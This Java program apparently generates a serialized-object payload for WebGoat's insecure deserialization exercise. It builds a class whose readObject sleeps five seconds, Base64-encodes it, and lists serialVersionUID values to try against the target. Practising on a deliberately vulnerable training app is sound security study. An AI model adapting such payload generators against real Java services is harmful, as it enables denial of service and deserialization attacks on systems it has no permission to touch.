import java.io.*;
import java.util.Base64;

/**
 * VulnerableTaskHolder with CONFIGURABLE serialVersionUID
 * Try different version numbers based on WebGoat feedback
 */

class VulnerableTaskHolder implements Serializable {
    // CHANGE THIS to match WebGoat's version
    private static final long serialVersionUID = 2L; // Try: 2L, 3L, 1337L, etc.
    
    private String taskName;
    private String taskAction;
    private long taskTime;
    
    public VulnerableTaskHolder(String taskName, String taskAction, long taskTime) {
        this.taskName = taskName;
        this.taskAction = taskAction;
        this.taskTime = taskTime;
    }
    
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        try {
            Thread.sleep(taskTime);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}

public class GeneratePayloadV2 {
    public static void main(String[] args) {
        long[] versionNumbers = {2L, 3L, 4L, 5L, 10L, 100L, 1337L, 2023L, 2024L, 2025L};
        
        System.out.println("==============================================");
        System.out.println("Generating Payloads with Different Versions");
        System.out.println("==============================================\n");
        
        try {
            // Create object with 5000ms (5 second) delay
            VulnerableTaskHolder payload = new VulnerableTaskHolder(
                "DelayTask",
                "sleep",
                5000L
            );
            
            // Serialize
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(payload);
            oos.flush();
            oos.close();
            
            byte[] serialized = bos.toByteArray();
            String base64 = Base64.getEncoder().encodeToString(serialized);
            
            System.out.println("Current serialVersionUID = 2L:");
            System.out.println(base64);
            System.out.println();
            
            // Show where version number is in the byte array
            System.out.println("Hex dump showing version location:");
            for (int i = 0; i < Math.min(60, serialized.length); i++) {
                System.out.printf("%02X ", serialized[i]);
                if ((i + 1) % 16 == 0) System.out.println();
            }
            System.out.println("\n");
            
            System.out.println("Version number is at bytes 28-35 (8 bytes for long)");
            System.out.println("Current version bytes:");
            for (int i = 28; i < 36 && i < serialized.length; i++) {
                System.out.printf("%02X ", serialized[i]);
            }
            System.out.println("\n\n");
            
            System.out.println("To try different versions, modify serialVersionUID in the code");
            System.out.println("and recompile, or manually edit the bytes.");
            System.out.println();
            System.out.println("Version values to try: 2L, 3L, 4L, 5L, 1337L, 2025L");
            
        } catch (Exception e) {
            System.err.println("Error: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
